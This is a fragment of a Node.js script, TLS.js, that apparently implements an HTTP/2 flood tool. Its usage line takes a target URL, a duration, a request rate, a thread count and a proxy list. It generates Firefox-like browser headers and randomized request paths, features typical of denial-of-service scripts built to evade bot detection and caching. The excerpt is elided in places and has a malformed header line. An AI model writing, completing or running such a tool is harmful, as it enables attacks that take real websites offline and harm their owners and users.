...
if (process.argv.length < 7) { console.log(`Usage: node TLS.js https://lyra.cool 120 64 5 proxy.txt`); process.exit(); }
const headers = {};
...
let headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "firefox", minVersion: 106, httpVersion: "2" },
    ],
    devices: [
        "desktop",
    ],
...
headers[":method"] = "GET";
headers["GET"] = "/HTTP/2";
headers[":path"] = parsedTarget.path + pathts1 + randstr(35) + queryz + randstr(35);
